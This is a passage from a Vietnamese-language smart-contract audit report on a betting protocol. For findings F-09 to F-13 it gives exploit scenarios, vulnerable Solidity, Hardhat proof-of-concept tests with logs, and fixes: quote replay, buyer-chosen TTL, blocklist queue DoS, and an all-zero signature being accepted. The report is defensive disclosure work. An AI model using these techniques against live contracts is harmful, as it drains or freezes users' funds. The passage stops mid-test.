#### Log PoC trên mã gốc

*`vulnerable-F09-F10-quote-binding.txt`*

```text
  [EVIDENCE] same signed quote: buy(ttl=30) → OK, buy(ttl=300) → OK
  [EVIDENCE] resulting tickets 0,1 expiry delta = 271 s for an identical quote
    ✔ the same quote is accepted with ttl=30 and ttl=300 (vulnerable) — expiry is buyer's choice (847ms)
```


*`vulnerable-F09-F10-quote-binding.txt`*

```text
  [EVIDENCE] at σ=0.0004: ttl=60 → EV -4.0%; ttl=30 → EV 33.5% (house pays the difference)
    ✔ economic impact at τ=60 pricing (engine/pricer.js, same σ fallback as engine/index.js)
```


#### Đề xuất sửa

Đưa `ttl` vào typehash và vào kiểu dữ liệu của quoter. Khi mua, `require(q.ttl == ttl, "ttl mismatch")`. Quoter bắt buộc có `ttl` khi ký.

#### Mã sau sửa

*`contracts/DiamondHouse.sol` · dòng 81–84*

```solidity
    bytes32 public immutable DOMAIN_SEPARATOR;
    bytes32 public constant QUOTE_TYPEHASH = keccak256(
        "Quote(uint8 classId,uint8 dir,uint128 stake,uint32 multX1e4,uint64 validUntil,bytes32 salt,address buyer,uint64 ttl)");
    uint256 public constant GOV_DELAY = 2 days;  // F-08: verifier / quoter swaps are timelocked
```


*`contracts/DiamondHouse.sol` · dòng 212–216*

```solidity
        require(q.validUntil <= block.timestamp + QUOTE_TTL, "quote too far ahead");
        require(q.multX1e4 >= MIN_MULT_X1E4 && q.multX1e4 <= MAX_MULT_X1E4, "mult clamp");
        require(q.multX1e4 >= minMultX1e4, "slippage: mult");
        require(q.ttl == ttl, "ttl mismatch");                       // F-09

```


*`engine/quoter.js` · dòng 1–18*

```javascript
// Quoter: assembles and EIP-712-signs quotes for DiamondHouse (binary tickets) and
// DiamondOptions (capped-vanilla spreads). Domain/types must mirror the contracts exactly.
//
// F-09 fix: `ttl` (the duration the multiplier was priced for, τ in seconds) is part of the
// signed payload. A quote is therefore valid for exactly one duration; the buyer cannot switch
// to a shorter/longer ttl that the quoter did not price. F-10: each quote is single-use on-chain.
export const HOUSE_TYPES = { Quote: [
  { name: "classId", type: "uint8" }, { name: "dir", type: "uint8" },
  { name: "stake", type: "uint128" }, { name: "multX1e4", type: "uint32" },
  { name: "validUntil", type: "uint64" }, { name: "salt", type: "bytes32" },
  { name: "buyer", type: "address" }, { name: "ttl", type: "uint64" } ] };

export const OPTIONS_TYPES = { OQuote: [
  { name: "classId", type: "uint8" }, { name: "dir", type: "uint8" },
  { name: "premium", type: "uint128" }, { name: "multX1e4", type: "uint32" },
  { name: "bandBps", type: "uint32" }, { name: "strikeX1e8", type: "uint64" },
  { name: "validUntil", type: "uint64" }, { name: "salt", type: "bytes32" },
  { name: "buyer", type: "address" }, { name: "ttl", type: "uint64" } ] };
```


#### PoC sau sửa

*`audit/test/F09-F10-quote-binding.test.js` · dòng 16–38*

```javascript
  it("the same quote is accepted with ttl=30 and ttl=300 (vulnerable) — expiry is buyer's choice", async () => {
    const W = await makeWorld({ withOptions: false, classCap: U(50_000) });
    const { lp, p1 } = W.signers;
    await (await W.house.connect(lp).lpDeposit(U(100_000))).wait();
    const { q, sig } = await signHouseQuote(W, { stake: U(100), multX1e4: X(3) }, p1, 60);
    const rShort = await revertOf(W.house.connect(p1).buyTicket(q, sig, X(3), 30));
    const rLong = await revertOf(W.house.connect(p1).buyTicket(q, sig, X(3), 300));
    const exp = async (id) => (await W.house.tickets(id)).expiry;
    const n = Number(await countTickets(W));
    console.log(`  [EVIDENCE] same signed quote: buy(ttl=30) → ${rShort ?? "OK"}, buy(ttl=300) → ${rLong ?? "OK"}`);
    if (!isFixed()) {
      expect(rShort).to.equal(null);
      expect(rLong).to.equal(null);
      const e1 = await exp(n - 2), e2 = await exp(n - 1);
      console.log(`  [EVIDENCE] resulting tickets ${n - 2},${n - 1} expiry delta = ${Number(e2 - e1)} s for an identical quote`);
      expect(e2 - e1 >= 270n && e2 - e1 <= 275n).to.equal(true); // 270 s + block-time jitter
    } else {
      // quote was signed with ttl=60: any other ttl is rejected, honest buyer uses 60
      expect(rShort).to.equal("ttl mismatch");
      expect(rLong).to.equal("ttl mismatch");
      expect(await revertOf(W.house.connect(p1).buyTicket(q, sig, X(3), 60))).to.equal(null);
    }
  });
```


*`fixed-F09-F10-quote-binding.txt`*

```text
  [EVIDENCE] same signed quote: buy(ttl=30) → ttl mismatch, buy(ttl=300) → ttl mismatch
    ✔ the same quote is accepted with ttl=30 and ttl=300 (vulnerable) — expiry is buyer's choice (826ms)
```


Bảng EV được giữ lại trong test làm bằng chứng giá trị kinh tế của lỗi:

*`fixed-F09-F10-quote-binding.txt`*

```text
  [EVIDENCE] at σ=0.0004: ttl=60 → EV -4.0%; ttl=30 → EV 33.5% (house pays the difference)
    ✔ economic impact at τ=60 pricing (engine/pricer.js, same σ fallback as engine/index.js)
```


#### Đánh giá sau sửa

- Mọi ttl khác với ttl đã ký bị từ chối bằng `ttl mismatch`.
- Phần còn lại: giá định theo τ = 60 vẫn là một giả định. Nếu thị trường thực có σ khác, cần định giá lại (mục 6).

---

### 4.10 F-10 — Quote dùng lại trong cửa sổ hiệu lực

**Mức độ:** Medium. **Loại:** tích tụ exposure ở giá cũ.

#### Mô tả và nguyên nhân gốc

`buyTicket` không đánh dấu quote đã dùng. Một quote hợp lệ mua được nhiều vé cho đến khi hết `validUntil`. Mọi lần mua dùng cùng giá, nên exposure của house tích tụ ở một giá có thể đã cũ.

#### Kịch bản khai thác

1. Người mua có một quote hợp lệ có giá tốt.
2. Hắn gọi `buyTicket` nhiều lần với cùng một quote, mỗi lần một stake.
3. House chịu exposure N × stake ở cùng một giá.

#### Mã lỗi (mã gốc)

*`audit/vulnerable/contracts/DiamondHouse.sol` · dòng 173–213*

```solidity
    function buyTicket(Quote calldata q, bytes calldata sig, uint32 minMultX1e4, uint64 ttl)
        external nonReentrant returns (uint256 id)
    {
        require(ttl == 30 || ttl == 60 || ttl == 120 || ttl == 300, "bad ttl");
        require(q.validUntil >= block.timestamp, "quote expired");
        require(q.validUntil <= block.timestamp + QUOTE_TTL, "quote too far ahead");
        require(q.multX1e4 >= MIN_MULT_X1E4 && q.multX1e4 <= MAX_MULT_X1E4, "mult clamp");
        require(q.multX1e4 >= minMultX1e4, "slippage: mult");

        ClassCfg memory cc = classCfg[q.classId];
        require(cc.enabled, "class disabled");
        require(q.multX1e4 <= cc.maxMultX1e4, "class mult cap");

        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", DOMAIN_SEPARATOR,
            keccak256(abi.encode(QUOTE_TYPEHASH, q.classId, q.dir, q.stake,
                                 q.multX1e4, q.validUntil, q.salt, msg.sender))));
        require(_recoverSig(digest, sig) == quoterSigner, "bad quote sig");
        require(q.buyer == msg.sender, "quote not yours");

        uint256 stake = q.stake;
        uint256 profit = uint256(q.multX1e4 - 10_000) * stake / 10_000; // (M−1)·S
        require(stake > 0, "zero stake");
        require(profit <= cc.profitCap, "profit over class cap");       // static per-ticket line

        require(usdc.transferFrom(msg.sender, address(this), stake), "pay in");
        openStakes += stake;

        id = tickets.length;
        tickets.push(Ticket({
            owner: msg.sender,
            stake: uint128(stake),
            multX1e4: q.multX1e4,
            expiry: uint64(block.timestamp + ttl),
            classId: q.classId,
            dir: q.dir,
            outcome: Outcome.UNSETTLED,
            queuedProfit: 0
        }));
        emit Sold(id, msg.sender, q.classId, q.dir, stake, q.multX1e4, uint64(block.timestamp + ttl));
        require(lanesIntact(), "lane drift");
    }
```


#### PoC

*`audit/test/F09-F10-quote-binding.test.js` · dòng 64–76*

```javascript
  it("one signed quote buys N tickets inside its validity window", async () => {
    const W = await makeWorld({ withOptions: false, classCap: U(50_000) });
    const { lp, p2 } = W.signers;
    await (await W.house.connect(lp).lpDeposit(U(100_000))).wait();
    const { q, sig } = await signHouseQuote(W, { stake: U(10), multX1e4: X(2) }, p2, 60);
    const results = [];
    for (let i = 0; i < 5; i++) results.push(await revertOf(W.house.connect(p2).buyTicket(q, sig, X(2), 60)));
    console.log(`  [EVIDENCE] 5 purchases with one quote → ${results.map((r) => r ?? "OK").join(", ")}`);
    const accepted = results.filter((r) => r === null).length;
    console.log(`  [EVIDENCE] accepted ${accepted}/5 tickets (aggregate exposure 5 × 10 stake at one stale price)`);
    if (!isFixed()) expect(accepted).to.equal(5);
    else expect(accepted).to.equal(1);
  });
```


#### Log PoC trên mã gốc

*`vulnerable-F09-F10-quote-binding.txt`*

```text
  [EVIDENCE] 5 purchases with one quote → OK, OK, OK, OK, OK
  [EVIDENCE] accepted 5/5 tickets (aggregate exposure 5 × 10 stake at one stale price)
    ✔ one signed quote buys N tickets inside its validity window (111ms)
```


#### Đề xuất sửa

Băm chữ ký thành `digest` và lưu `quoteUsed[digest] = true`. Mỗi quote chỉ dùng một lần.

#### Mã sau sửa

*`contracts/DiamondHouse.sol` · dòng 218–228*

```solidity
        require(cc.enabled, "class disabled");
        require(q.multX1e4 <= cc.maxMultX1e4, "class mult cap");

        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", DOMAIN_SEPARATOR,
            keccak256(abi.encode(QUOTE_TYPEHASH, q.classId, q.dir, q.stake,
                                 q.multX1e4, q.validUntil, q.salt, msg.sender, q.ttl))));
        require(_recoverSig(digest, sig) == quoterSigner, "bad quote sig");
        require(q.buyer == msg.sender, "quote not yours");
        require(!quoteUsed[digest], "quote used");                   // F-10
        quoteUsed[digest] = true;

```


#### PoC sau sửa

*`audit/test/F09-F10-quote-binding.test.js` · dòng 64–76*

```javascript
  it("one signed quote buys N tickets inside its validity window", async () => {
    const W = await makeWorld({ withOptions: false, classCap: U(50_000) });
    const { lp, p2 } = W.signers;
    await (await W.house.connect(lp).lpDeposit(U(100_000))).wait();
    const { q, sig } = await signHouseQuote(W, { stake: U(10), multX1e4: X(2) }, p2, 60);
    const results = [];
    for (let i = 0; i < 5; i++) results.push(await revertOf(W.house.connect(p2).buyTicket(q, sig, X(2), 60)));
    console.log(`  [EVIDENCE] 5 purchases with one quote → ${results.map((r) => r ?? "OK").join(", ")}`);
    const accepted = results.filter((r) => r === null).length;
    console.log(`  [EVIDENCE] accepted ${accepted}/5 tickets (aggregate exposure 5 × 10 stake at one stale price)`);
    if (!isFixed()) expect(accepted).to.equal(5);
    else expect(accepted).to.equal(1);
  });
```


*`fixed-F09-F10-quote-binding.txt`*

```text
  [EVIDENCE] 5 purchases with one quote → OK, quote used, quote used, quote used, quote used
  [EVIDENCE] accepted 1/5 tickets (aggregate exposure 5 × 10 stake at one stale price)
    ✔ one signed quote buys N tickets inside its validity window (114ms)
```


#### Đánh giá sau sửa

- Chỉ 1 trong 5 lần mua được chấp nhận, các lần còn lại báo `quote used`.
- Phần còn lại: một quote vẫn có thể bị dùng trong lúc giá đã đổi, nếu quote có `validUntil` dài. Đề xuất giữ `validUntil` ngắn.

---

### 4.11 F-11 — Head-of-line DoS khi token từ chối chuyển

**Mức độ:** Medium (High nếu token có blocklist, như USDC thật). **Loại:** DoS hàng đợi và settlement.

#### Mô tả và nguyên nhân gốc

`_payQueue` và các đường trả tiền trực tiếp dùng `require(usdc.transfer(...))`. Hàng đợi là FIFO và không được bỏ qua người đầu hàng. Nếu người đầu hàng bị token từ chối (blocklist, pause), mọi lần `_payQueue` đều revert. Mọi settlement có trả tiền, harvest và refund đều revert theo. Pool kẹt vĩnh viễn trong khi những người khác không nhận được gì.

#### Kịch bản khai thác

1. Người chơi (hoặc kẻ tấn công) có một vé được xếp vào hàng đợi. Địa chỉ của họ bị blocklist (hoặc token bị pause cho địa chỉ đó).
2. Mọi lần `settle` có trả tiền và `harvest` đi qua người đầu hàng và revert.
3. Pool không được giải phóng, mọi vé khác không settle được.

#### Mã lỗi (mã gốc)

Đường trả tiền trực tiếp:

*`audit/vulnerable/contracts/DiamondHouse.sol` · dòng 250–265*

```solidity
            } else {
                _enqueue(t.owner, netProfit, uint64(id)); // no jumping the line
                profitQueued = netProfit;
            }
            t.queuedProfit = uint128(profitQueued);
            require(usdc.transfer(t.owner, S + profitPaid), "pay out");
        } else if (o == Outcome.KNOCKED) {
            pool += S;                 // papertrade rule: loser money feeds the house pot directly
            stakeBack = 0;
        } else { // EXPIRED: rebate 15% of stake, rest to pool
            uint256 rebate = S * REBATE_BPS / BPS;
            stakeBack = rebate;
            pool += S - rebate;
            require(usdc.transfer(t.owner, rebate), "rebate out");
        }

```


Hàng đợi:

*`audit/vulnerable/contracts/DiamondHouse.sol` · dòng 302–320*

```solidity
    // ---------------- FIFO payout queue ----------------
    function _enqueue(address who, uint256 amount, uint64 ticketId) internal {
        payoutQueue.push(QueueEntry({ owner: who, amount: uint128(amount), ticketId: ticketId }));
        queueDebt += amount;
        queueOf[ticketId] = payoutQueue.length; // entryId+1 for claimInfo()
        emit Queued(payoutQueue.length - 1, ticketId, who, amount);
    }

    function _payQueue(uint256 maxN) internal {
        uint256 n = maxN;
        while (n > 0 && queueHead < payoutQueue.length && pool > 0) {
            QueueEntry storage e = payoutQueue[queueHead];
            uint256 pay = e.amount > pool ? pool : e.amount;
            e.amount -= uint128(pay);
            pool -= pay;
            queueDebt -= pay;
            require(usdc.transfer(e.owner, pay), "queue out");
            emit Dequeued(queueHead, e.owner, pay);
            if (e.amount == 0) queueHead++;
```


Options có cùng mẫu:

*`audit/vulnerable/contracts/DiamondOptions.sol` · dòng 267–276*

```solidity
    function _payQueue(uint256 maxN) internal {
        uint256 n = maxN;
        while (n > 0 && queueHead < payoutQueue.length && pool > 0) {
            QueueEntry storage e = payoutQueue[queueHead];
            uint256 pay = e.amount > pool ? pool : e.amount;
            e.amount -= uint128(pay);
            pool -= pay;
            queueDebt -= pay;
            require(usdc.transfer(e.owner, pay), "queue out");
            emit ODequeued(queueHead, e.owner, pay);
```


#### PoC

*`audit/test/F11-F14-ops-and-economics.test.js` · dòng 21–51*

```javascript
  it("blocked queue head halts all settlements while pool > 0", async () => {
    const W = await makeWorld({ withOptions: false, usdcName: "BlocklistUSDC", classCap: U(50_000) });
    const { lp, p1, p2, p3, owner } = W.signers;
    // two winners queue up (pool empty, no LP yet)
    const w1 = await buyTicket(W, p1, 100, 2); await (await settleHouse(W, w1, 1)).wait();
    const w2 = await buyTicket(W, p2, 100, 2); await (await settleHouse(W, w2, 1)).wait();
    console.log(`  [EVIDENCE] queue: p1 & p2 owed ${Number(await W.house.queueDebt()) / 1e6} USDC total`);
    await (await W.usdc.connect(owner).setBlocked(p1.address, true)).wait();   // USDC admin blocklists p1
    await (await W.house.connect(lp).lpDeposit(U(1000))).wait();              // pool now has cash
    const loser = await buyTicket(W, p3, 10, 2);
    const rLoss = await revertOf(settleHouse(W, loser, 2));                    // ordinary KNOCKED settle
    const rHarv = await revertOf(W.house.connect(p3).harvest(4));
    console.log(`  [EVIDENCE] settle(KNOCKED) of an unrelated ticket → ${rLoss ?? "OK"}`);
    console.log(`  [EVIDENCE] harvest(4) → ${rHarv ?? "OK"}; pool=${Number(await W.house.pool()) / 1e6}`);
    if (!isFixed()) {
      expect(rLoss).to.equal("blocked");
      expect(rHarv).to.equal("blocked");
    } else {
      expect(rLoss).to.equal(null);
      expect(rHarv).to.equal(null);
      // the blocked payee's amount is credited for later withdrawal instead of stalling the queue
      const credit = await W.house.credits(p1.address);
      expect(credit).gt(0n);
      // the blocklist is lifted later: the credited USDC is still there to withdraw
      await (await W.usdc.connect(owner).setBlocked(p1.address, false)).wait();
      const bp1 = await W.usdc.balanceOf(p1.address);
      await (await W.house.connect(p1).withdrawCredit()).wait();
      expect((await W.usdc.balanceOf(p1.address)) - bp1).to.equal(credit);
      expect(await W.house.credits(p1.address)).to.equal(0n);
    }
  });
```


#### Log PoC trên mã gốc

*`vulnerable-F11-F14-ops-and-economics.txt`*

```text
  [EVIDENCE] queue: p1 & p2 owed 192.02 USDC total
  [EVIDENCE] settle(KNOCKED) of an unrelated ticket → blocked
  [EVIDENCE] harvest(4) → blocked; pool=1000
    ✔ blocked queue head halts all settlements while pool > 0 (871ms)
```


#### Đề xuất sửa

1. Chuyển tiền bằng `call` cấp thấp (`_send`). Nếu token từ chối, ghi có số tiền cho người nhận (`credits[to]`, `totalCredits`) thay vì revert.
2. Người nhận rút credit bằng `withdrawCredit()` khi được gỡ blocklist.
3. `totalCredits` được tính vào nợ trong bất biến solvency (F-01).
4. Gas floor: `_send` revert nếu gas còn lại dưới 60,000, để kẻ gọi không thể cố tình cấp ít gas để biến thanh toán thành credit.

#### Mã sau sửa

*`contracts/DiamondHouse.sol` · dòng 342–364*

```solidity
    /// F-11: a token-level refusal (blocklist, pause) must not stall the protocol. The amount is
    /// credited to the payee and can be pulled with withdrawCredit(); the lane stays solvent.
    function _send(address to, uint256 amount) internal {
        if (amount == 0) return;
        // gas floor: a caller must not be able to starve the token call so that it fails and the
        // payout silently becomes a credit (no theft, but a griefing path). Revert instead.
        require(gasleft() >= SEND_GAS_FLOOR, "send gas");
        (bool ok, bytes memory ret) = address(usdc).call(
            abi.encodeWithSelector(IERC20Min.transfer.selector, to, amount));
        if (ok && (ret.length == 0 || abi.decode(ret, (bool)))) return;
        credits[to] += amount;
        totalCredits += amount;
        emit Credited(to, amount);
    }
    function withdrawCredit() external nonReentrant {
        uint256 a = credits[msg.sender];
        require(a > 0, "no credit");
        credits[msg.sender] = 0;
        totalCredits -= a;
        require(usdc.transfer(msg.sender, a), "credit out");
        emit CreditWithdrawn(msg.sender, a);
    }

```


*`contracts/DiamondHouse.sol` · dòng 85–85*

```solidity
    uint256 public constant SEND_GAS_FLOOR = 60_000;  // F-11: minimum gas left for a token payout
```


*`contracts/DiamondOptions.sol` · dòng 290–312*

```solidity

    /// F-11: refused transfers are credited for pull-withdrawal instead of reverting the queue.
    function _send(address to, uint256 amount) internal {
        if (amount == 0) return;
        // gas floor: a caller must not be able to starve the token call so that it fails and the
        // payout silently becomes a credit (no theft, but a griefing path). Revert instead.
        require(gasleft() >= SEND_GAS_FLOOR, "send gas");
        (bool ok, bytes memory ret) = address(usdc).call(
            abi.encodeWithSelector(IERC20MinO.transfer.selector, to, amount));
        if (ok && (ret.length == 0 || abi.decode(ret, (bool)))) return;
        credits[to] += amount;
        totalCredits += amount;
        emit Credited(to, amount);
    }
    function withdrawCredit() external nonReentrant {
        uint256 a = credits[msg.sender];
        require(a > 0, "no credit");
        credits[msg.sender] = 0;
        totalCredits -= a;
        require(usdc.transfer(msg.sender, a), "credit out");
        emit CreditWithdrawn(msg.sender, a);
    }

```


#### PoC sau sửa

*`audit/test/F11-F14-ops-and-economics.test.js` · dòng 21–51*

```javascript
  it("blocked queue head halts all settlements while pool > 0", async () => {
    const W = await makeWorld({ withOptions: false, usdcName: "BlocklistUSDC", classCap: U(50_000) });
    const { lp, p1, p2, p3, owner } = W.signers;
    // two winners queue up (pool empty, no LP yet)
    const w1 = await buyTicket(W, p1, 100, 2); await (await settleHouse(W, w1, 1)).wait();
    const w2 = await buyTicket(W, p2, 100, 2); await (await settleHouse(W, w2, 1)).wait();
    console.log(`  [EVIDENCE] queue: p1 & p2 owed ${Number(await W.house.queueDebt()) / 1e6} USDC total`);
    await (await W.usdc.connect(owner).setBlocked(p1.address, true)).wait();   // USDC admin blocklists p1
    await (await W.house.connect(lp).lpDeposit(U(1000))).wait();              // pool now has cash
    const loser = await buyTicket(W, p3, 10, 2);
    const rLoss = await revertOf(settleHouse(W, loser, 2));                    // ordinary KNOCKED settle
    const rHarv = await revertOf(W.house.connect(p3).harvest(4));
    console.log(`  [EVIDENCE] settle(KNOCKED) of an unrelated ticket → ${rLoss ?? "OK"}`);
    console.log(`  [EVIDENCE] harvest(4) → ${rHarv ?? "OK"}; pool=${Number(await W.house.pool()) / 1e6}`);
    if (!isFixed()) {
      expect(rLoss).to.equal("blocked");
      expect(rHarv).to.equal("blocked");
    } else {
      expect(rLoss).to.equal(null);
      expect(rHarv).to.equal(null);
      // the blocked payee's amount is credited for later withdrawal instead of stalling the queue
      const credit = await W.house.credits(p1.address);
      expect(credit).gt(0n);
      // the blocklist is lifted later: the credited USDC is still there to withdraw
      await (await W.usdc.connect(owner).setBlocked(p1.address, false)).wait();
      const bp1 = await W.usdc.balanceOf(p1.address);
      await (await W.house.connect(p1).withdrawCredit()).wait();
      expect((await W.usdc.balanceOf(p1.address)) - bp1).to.equal(credit);
      expect(await W.house.credits(p1.address)).to.equal(0n);
    }
  });
```


Test trên nhánh fixed kiểm thêm: sau khi gỡ blocklist, người bị blocklist gọi `withdrawCredit()` và nhận đúng số đã ghi có.

*`fixed-F11-F14-ops-and-economics.txt`*

```text
  [EVIDENCE] queue: p1 & p2 owed 192.02 USDC total
  [EVIDENCE] settle(KNOCKED) of an unrelated ticket → OK
  [EVIDENCE] harvest(4) → OK; pool=817.98
    ✔ blocked queue head halts all settlements while pool > 0 (849ms)
```


#### Đánh giá sau sửa

- Hàng đợi tiếp tục chạy. Harvest trả được người khác.
- Credit rút được đúng số sau khi gỡ blocklist.
- Phần còn lại: người bị blocklist không nhận được tiền cho đến khi được gỡ. Đây là hành vi của token, không phải của protocol.

---

### 4.12 F-12 — Queue entry bằng 0 và chữ ký rỗng khi chưa đặt budgetAttester

**Mức độ:** Low. **Loại:** vệ sinh, nhưng (b) cho phép đăng epoch không có chữ ký hợp lệ.

#### Mô tả và nguyên nhân gốc

**(a)** `_enqueue` không kiểm `amount == 0`. Vé thắng 1 wei với `queueDebt > 0` tạo ra entry bằng 0 trong hàng đợi. Entry đó chiếm chỗ và làm rối hàng đợi.

**(b)** `postEpoch` kiểm `_rec(h, budgetSig) == budgetAttester`. Khi `budgetAttester == 0`, `_rec` trả về 0 với chữ ký không hợp lệ, và `0 == 0` nên được chấp nhận. Khi owner quên đặt budgetAttester, mọi chữ ký không hợp lệ đều cho `_rec` = 0 và được chấp nhận (test dùng chữ ký 65 byte bằng 0).

#### Kịch bản khai thác

**(a)** Kẻ tấn công cược 1 wei và thắng khi hàng đợi đang có nợ. Entry 0 được thêm vào hàng đợi.

**(b)** Nếu `budgetAttester` chưa đặt, kẻ tấn công (hoặc owner vô tình) gọi `postEpoch` với chữ ký 65 byte bằng 0 và được chấp nhận.

#### Mã lỗi (mã gốc)

Hàng đợi không kiểm 0:

*`audit/vulnerable/contracts/DiamondHouse.sol` · dòng 303–307*

```solidity
    function _enqueue(address who, uint256 amount, uint64 ticketId) internal {
        payoutQueue.push(QueueEntry({ owner: who, amount: uint128(amount), ticketId: ticketId }));
        queueDebt += amount;
        queueOf[ticketId] = payoutQueue.length; // entryId+1 for claimInfo()
        emit Queued(payoutQueue.length - 1, ticketId, who, amount);
```


Chữ ký không kiểm `budgetAttester != 0`:

*`audit/vulnerable/contracts/DiamondDistributor.sol` · dòng 116–117*

```solidity
        require(_rec(h, budgetSig) == budgetAttester, "bad budget sig");
        uint256 budget = budgetFor(anchorUsd, priceX1e8);   // uses projected (adaptive) rate
```


#### PoC

*`audit/test/F11-F14-ops-and-economics.test.js` · dòng 56–70*

```javascript
  it("(a) a 1-wei winning ticket with queueDebt>0 pushes a zero-amount queue entry", async () => {
    const W = await makeWorld({ withOptions: false, classCap: U(50_000) });
    const { p1, p2 } = W.signers;
    const w = await buyTicket(W, p2, 100, 2); await (await settleHouse(W, w, 1)).wait(); // creates debt
    const before = Number(await W.house.liveQueueEntries());
    // 1 wei stake (0.000001 USDC): profit = floor(0.05 × 1 wei) = 0
    const { q, sig } = await signHouseQuote(W, { stake: 1n, multX1e4: X(1.05) }, p1, 60);
    const rBuy = await revertOf(W.house.connect(p1).buyTicket(q, sig, X(1.05), 60));
    const id = Number(await countTickets(W)) - 1;
    const rSet = await revertOf(settleHouse(W, id, 1));
    const after = Number(await W.house.liveQueueEntries());
    console.log(`  [EVIDENCE] 1-wei WON ticket: buy → ${rBuy ?? "OK"}, settle → ${rSet ?? "OK"}; queue entries ${before} → ${after}`);
    if (!isFixed()) expect(after).to.equal(before + 1);
    else expect(after).to.equal(before);
  });
```


*`audit/test/F11-F14-ops-and-economics.test.js` · dòng 72–82*

```javascript
  it("(b) postEpoch accepts an all-zero signature while budgetAttester is unset", async () => {
    const W = await makeWorld({ withOptions: false, classCap: U(50_000) });
    const dist = W.dist;
    await (await W.diamond.setMinter(await dist.getAddress())).wait();
    // NOTE: setBudgetAttester is deliberately NOT called (deployer forgot the step)
    const zeroSig = "0x" + "00".repeat(65);
    const r = await revertOf(dist.postEpoch(1, ethers.keccak256("0x01"), 1n, 100n, 1_000_000n, zeroSig));
    console.log(`  [EVIDENCE] postEpoch(epoch 1, 65-byte zero sig, budgetAttester unset) → ${r ?? "OK"}`);
    if (!isFixed()) expect(r).to.equal(null);
    else expect(r).to.equal("no budget attester");
  });
```


#### Log PoC trên mã gốc

*`vulnerable-F11-F14-ops-and-economics.txt`*

```text
  [EVIDENCE] 1-wei WON ticket: buy → OK, settle → OK; queue entries 1 → 2
    ✔ (a) a 1-wei winning ticket with queueDebt>0 pushes a zero-amount queue entry (122ms)
```


*`vulnerable-F11-F14-ops-and-economics.txt`*

```text
  [EVIDENCE] postEpoch(epoch 1, 65-byte zero sig, budgetAttester unset) → OK
    ✔ (b) postEpoch accepts an all-zero signature while budgetAttester is unset (95ms)
```


#### Đề xuất sửa

**(a)** `if (amount == 0) return;` trong `_enqueue`.
**(b)** `require(budgetAttester != address(0), "no budget attester")` trước khi kiểm chữ ký.

#### Mã sau sửa

*`contracts/DiamondHouse.sol` · dòng 365–369*

```solidity
    // ---------------- FIFO payout queue ----------------
    function _enqueue(address who, uint256 amount, uint64 ticketId) internal {
        if (amount == 0) return;                                     // F-12: no zero-value entries
        payoutQueue.push(QueueEntry({ owner: who, amount: uint128(amount), ticketId: ticketId }));
        queueDebt += amount;
```


*`contracts/DiamondDistributor.sol` · dòng 119–122*

```solidity
        bytes calldata budgetSig
    ) external onlyOwner {
        require(budgetAttester != address(0), "no budget attester");   // F-12b
        require(epochId == lastEpoch + 1, "epoch order");
```


#### PoC sau sửa

*`audit/test/F11-F14-ops-and-economics.test.js` · dòng 56–70*

```javascript
  it("(a) a 1-wei winning ticket with queueDebt>0 pushes a zero-amount queue entry", async () => {
    const W = await makeWorld({ withOptions: false, classCap: U(50_000) });
    const { p1, p2 } = W.signers;
    const w = await buyTicket(W, p2, 100, 2); await (await settleHouse(W, w, 1)).wait(); // creates debt
    const before = Number(await W.house.liveQueueEntries());
    // 1 wei stake (0.000001 USDC): profit = floor(0.05 × 1 wei) = 0
    const { q, sig } = await signHouseQuote(W, { stake: 1n, multX1e4: X(1.05) }, p1, 60);
    const rBuy = await revertOf(W.house.connect(p1).buyTicket(q, sig, X(1.05), 60));
    const id = Number(await countTickets(W)) - 1;
    const rSet = await revertOf(settleHouse(W, id, 1));
    const after = Number(await W.house.liveQueueEntries());
    console.log(`  [EVIDENCE] 1-wei WON ticket: buy → ${rBuy ?? "OK"}, settle → ${rSet ?? "OK"}; queue entries ${before} → ${after}`);
    if (!isFixed()) expect(after).to.equal(before + 1);
    else expect(after).to.equal(before);
  });
```


*`audit/test/F11-F14-ops-and-economics.test.js` · dòng 72–82*

```javascript
  it("(b) postEpoch accepts an all-zero signature while budgetAttester is unset", async () => {
    const W = await makeWorld({ withOptions: false, classCap: U(50_000) });
    const dist = W.dist;
    await (await W.diamond.setMinter(await dist.getAddress())).wait();
    // NOTE: setBudgetAttester is deliberately NOT called (deployer forgot the step)
    const zeroSig = "0x" + "00".repeat(65);
    const r = await revertOf(dist.postEpoch(1, ethers.keccak256("0x01"), 1n, 100n, 1_000_000n, zeroSig));
    console.log(`  [EVIDENCE] postEpoch(epoch 1, 65-byte zero sig, budgetAttester unset) → ${r ?? "OK"}`);
    if (!isFixed()) expect(r).to.equal(null);
    else expect(r).to.equal("no budget attester");
  });
```


*`fixed-F11-F14-ops-and-economics.txt`*

```text
  [EVIDENCE] 1-wei WON ticket: buy → OK, settle → OK; queue entries 1 → 1
    ✔ (a) a 1-wei winning ticket with queueDebt>0 pushes a zero-amount queue entry (130ms)
```


*`fixed-F11-F14-ops-and-economics.txt`*

```text
  [EVIDENCE] postEpoch(epoch 1, 65-byte zero sig, budgetAttester unset) → no budget attester
    ✔ (b) postEpoch accepts an all-zero signature while budgetAttester is unset (98ms)
```


#### Đánh giá sau sửa

- (a) không còn entry 0 (1 → 1 entry).
- (b) bị từ chối với `no budget attester`.

---

### 4.13 F-13 — Doanh thu bị kẹt khi chưa có staker

**Mức độ:** Medium. **Loại:** kẹt tiền vĩnh viễn.

#### Mô tả và nguyên nhân gốc

`RevenueSplit.notifyRevenue` nhận USDC từ House, nhưng chỉ cộng vào index khi `totalStaked > 0`. Khi không có staker, USDC nằm trong contract và không có đường nào phát đi. Staker đến sau cũng không claim được phần đó.

#### Kịch bản khai thác

Đây không phải kịch bản tấn công, mà là lỗi làm mất tiền do thiết kế: owner gọi `distributeRevenue` khi chưa có staker, và tiền bị kẹt. Có thể xảy ra tự nhiên khi giai đoạn đầu chưa có ai stake.

#### Mã lỗi (mã gốc)

*`audit/vulnerable/contracts/RevenueSplit.sol` · dòng 85–92*

```solidity
    function notifyRevenue(uint256 amount) external {
        require(msg.sender == house || pusher[msg.sender], "not house");
        require(usdc.transferFrom(msg.sender, address(this), amount), "pay in");
        if (totalStaked > 0) {
            rewardIndex += amount * 1e18 / totalStaked;
        }
        emit RevenueNotified(amount, rewardIndex);
    }
```


#### PoC

*`audit/test/F11-F14-ops-and-economics.test.js` · dòng 87–115*

```javascript
  it("owner distributes revenue to an empty staking set; USDC is stranded forever", async () => {
    const W = await makeWorld({ withOptions: false, classCap: U(50_000) });
    const { owner, lp, p2 } = W.signers;
    await (await W.house.connect(lp).lpDeposit(U(10_000))).wait();
    await (await W.house.connect(owner).setTargetPool(0)).wait();             // waterfall open
